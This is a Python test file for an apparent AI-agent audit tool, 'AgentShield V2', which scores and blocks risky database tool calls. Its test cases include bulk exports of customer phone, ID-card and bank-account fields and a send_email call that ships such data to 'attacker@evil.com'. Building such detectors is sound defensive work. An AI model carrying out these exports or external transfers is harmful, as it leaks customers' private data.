"""
test_database_shadow.py
=======================
V2 核心测试：数据库影子预演 + 风险评分 + 熔断决策

Demo场景：
财务Agent试图导出客户敏感数据并发送外部邮箱
预期结果：shadow_risk_score >= 0.90 → fuse_action = "block"
"""

import pytest
from app.tool_call import ToolCallRequest, ToolCallAuditEngine, RiskLevel
from app.shadow.database.sql_analyzer import SQLAnalyzer
from app.shadow.database.database_shadow_simulator import DatabaseShadowSimulator
from app.shadow.database.database_shadow_risk_scorer import DatabaseShadowRiskScorer


# ─── Fixtures ─────────────────────────────────────────────────

@pytest.fixture
def engine():
    return ToolCallAuditEngine()


@pytest.fixture
def sql_analyzer():
    return SQLAnalyzer()


@pytest.fixture
def simulator():
    return DatabaseShadowSimulator()


@pytest.fixture
def scorer():
    return DatabaseShadowRiskScorer()


# ─── SQLAnalyzer Tests ────────────────────────────────────────

class TestSQLAnalyzer:
    """SQL解析器单元测试"""

    def test_parse_simple_select(self, sql_analyzer):
        sql = "SELECT phone, id_card, address FROM customers WHERE status = 1"
        info = sql_analyzer.analyze(sql)
        assert info.tables == ["customers"]
        assert info.operation == "SELECT"
        assert "phone" in info.selected_columns
        assert "id_card" in info.selected_columns
        assert "phone" in info.sensitive_fields_detected or "id_card" in info.sensitive_fields_detected

    def test_parse_bulk_select_no_where(self, sql_analyzer):
        sql = "SELECT * FROM customers"
        info = sql_analyzer.analyze(sql)
        assert info.tables == ["customers"]
        assert info.is_bulk_query is True
        assert info.sensitive_fields_detected  # 全表扫描 → 敏感

    def test_parse_insert(self, sql_analyzer):
        sql = "INSERT INTO orders (product_id, quantity, price) VALUES (1, 10, 99.9)"
        info = sql_analyzer.analyze(sql)
        assert "orders" in info.tables
        assert info.operation == "INSERT"

    def test_parse_update_with_where(self, sql_analyzer):
        sql = "UPDATE employee_salary SET salary = 5000 WHERE id = 123"
        info = sql_analyzer.analyze(sql)
        assert "employee_salary" in info.tables
        assert info.operation == "UPDATE"
        assert "salary" in info.sensitive_fields_detected

    def test_sensitive_field_detection(self, sql_analyzer):
        sql = "SELECT name, phone, bank_account FROM users WHERE id > 0"
        info = sql_analyzer.analyze(sql)
        sensitive = info.sensitive_fields_detected
        assert any("phone" in s for s in sensitive)
        assert any("bank" in s for s in sensitive)


# ─── DatabaseShadowSimulator Tests ───────────────────────────

class TestDatabaseShadowSimulator:
    """影子预演器单元测试"""

    def test_simulate_customers_export(self, simulator, sql_analyzer):
        sql = "SELECT phone, id_card, address FROM customers WHERE status = 1"
        sql_info = sql_analyzer.analyze(sql)
        effect = simulator.simulate(
            tool_name="cursor.execute",
            params={"sql": sql},
            sql_info=sql_info,
        )
        assert "customers" in effect.predicted_tables
        assert effect.affected_rows_estimate > 0
        assert len(effect.sensitive_fields_detected) > 0
        assert effect.is_bulk_operation is False  # 有WHERE

    def test_simulate_bulk_export(self, simulator, sql_analyzer):
        sql = "SELECT * FROM customers"  # 无WHERE → 全表
        sql_info = sql_analyzer.analyze(sql)
        effect = simulator.simulate(
            tool_name="cursor.execute",
            params={"sql": sql},
            sql_info=sql_info,
        )
        assert effect.is_bulk_operation is True
        assert effect.affected_rows_estimate >= 50_000

    def test_simulate_external_transfer(self, simulator, sql_analyzer):
        sql = "SELECT phone, bank_account FROM customers"
        sql_info = sql_analyzer.analyze(sql)
        effect = simulator.simulate(
            tool_name="send_email",          # 外部传输工具
            params={"sql": sql, "to": "attacker@evil.com"},
            sql_info=sql_info,
        )
        assert effect.is_external_transfer is True


# ─── DatabaseShadowRiskScorer Tests ───────────────────────────

class TestDatabaseShadowRiskScorer:
    """风险评分器单元测试：核心边界验证"""

    def test_demo_scenario_score(self, scorer, sql_analyzer, simulator):
        """
        【核心Demo场景验证】
        财务Agent执行: SELECT phone, id_card, address FROM customers WHERE status = 1
        预期：shadow_risk_score >= 0.90 → block
        """
        sql = "SELECT phone, id_card, address FROM customers WHERE status = 1"
        sql_info = sql_analyzer.analyze(sql)
        effect = simulator.simulate(
            tool_name="cursor.execute",
            params={"sql": sql},
            sql_info=sql_info,
        )
        score = scorer.score(
            tool_name="cursor.execute",
            params={"sql": sql},
            sql_info=sql_info,
            simulated_effect=effect,
        )
        # 核心断言：Demo场景必须 >= 0.90
        assert score >= 0.90, f"Demo场景必须触发高风险熔断，当前分数={score}"
        print(f"[PASS] Demo场景风险分={score} >= 0.90 ✅")

    def test_external_transfer_always_high(self, scorer, sql_analyzer, simulator):
        """
        外部传输场景：邮件外发 → 风险分必须很高
        """
        sql = "SELECT name, phone FROM customers"
        sql_info = sql_analyzer.analyze(sql)
        effect = simulator.simulate(
            tool_name="send_email",
            params={"sql": sql, "to": "external@company.com"},
            sql_info=sql_info,
        )
        score = scorer.score(
            tool_name="send_email",
            params={"sql": sql, "to": "external@company.com"},
            sql_info=sql_info,
            simulated_effect=effect,
        )
        assert score >= 0.90, f"外部传输场景 score={score} < 0.90"
        print(f"[PASS] 外部传输风险分={score} >= 0.90 ✅")

    def test_safe_query_low_score(self, scorer, sql_analyzer, simulator):
        """
        安全查询：只查products表的name/price → 低风险
        """
        sql = "SELECT name, price FROM products WHERE category = 'electronics'"
        sql_info = sql_analyzer.analyze(sql)
        effect = simulator.simulate(
            tool_name="cursor.execute",
            params={"sql": sql},
            sql_info=sql_info,
        )
        score = scorer.score(
            tool_name="cursor.execute",
            params={"sql": sql},
            sql_info=sql_info,
            simulated_effect=effect,
        )
        assert score < 0.50, f"安全查询分数={score} 不应该高"
        print(f"[PASS] 安全查询风险分={score} < 0.50 ✅")

    def test_bulk_export_score(self, scorer, sql_analyzer, simulator):
        """
        批量导出：SELECT * FROM customers（无WHERE）→ 高风险
        """
        sql = "SELECT * FROM customers"
        sql_info = sql_analyzer.analyze(sql)
        effect = simulator.simulate(
            tool_name="cursor.execute",
            params={"sql": sql},
            sql_info=sql_info,
        )
        score = scorer.score(
            tool_name="cursor.execute",
            params={"sql": sql},
            sql_info=sql_info,
            simulated_effect=effect,
        )
        assert score >= 0.70, f"批量导出 score={score}"
        print(f"[PASS] 批量导出风险分={score} >= 0.70 ✅")


# ─── ToolCallAuditEngine Integration Test ─────────────────────

class TestToolCallAuditEngine:
    """端到端集成测试"""

    def test_demo_scenario_end_to_end(self, engine):
        """
        【Demo场景端到端验证】
        输入：财务Agent → cursor.execute(SELECT phone, id_card, address FROM customers)
        预期：shadow_risk_score >= 0.90 → fuse_action = "block"
        """
        request = ToolCallRequest(
            tool_name="cursor.execute",
            params={
                "sql": "SELECT phone, id_card, address FROM customers WHERE status = 1",
                "args": [],
            },
            agent_id="finance_agent",
            session_id="session_001",
            is_database_tool=True,
        )

        result = engine.audit(request)

        # 核心断言链
        assert result.shadow_risk_score is not None
        assert result.shadow_risk_score >= 0.90, (
            f"Demo场景必须触发熔断！当前 score={result.shadow_risk_score}"
        )
        assert result.fuse_action == "block", (
            f"高风险必须block，当前 action={result.fuse_action}"
        )
        assert result.audit_log_id is not None, "必须生成审计日志ID"
        assert "phone" in str(result.simulated_effect.get("sensitive_fields_detected", []))
        print(f"[PASS] Demo端到端：score={result.shadow_risk_score}, action={result.fuse_action} ✅")

    def test_safe_query_allowed(self, engine):
        """
        安全查询直接放行
        """
        request = ToolCallRequest(
            tool_name="cursor.execute",
            params={"sql": "SELECT name, price FROM products WHERE category = 'electronics'"},
            agent_id="finance_agent",
            session_id="session_002",
            is_database_tool=True,
        )
        result = engine.audit(request)
        assert result.fuse_action == "allow"
        assert result.shadow_risk_score < 0.50
        print(f"[PASS] 安全查询放行：score={result.shadow_risk_score}, action={result.fuse_action} ✅")

    def test_non_database_tool_pass(self, engine):
        """
        非数据库工具（如发邮件但不带敏感数据）→ 直接放行
        """
        request = ToolCallRequest(
            tool_name="send_message",
            params={"message": "Hello team"},
            agent_id="finance_agent",
            session_id="session_003",
            is_database_tool=False,
        )
        result = engine.audit(request)
        assert result.fuse_action == "allow"
        assert result.fuse_reason == "non_database_tool"
        print(f"[PASS] 非数据库工具直接放行 ✅")


# ─── Run Summary ─────────────────────────────────────────────

def test_run_summary():
    """测试套件概览"""
    print("\n" + "="*60)
    print("AgentShield V2 - 数据库工具调用审计")
    print("Demo场景：财务Agent导出客户敏感数据 → 拦截")
    print("="*60)
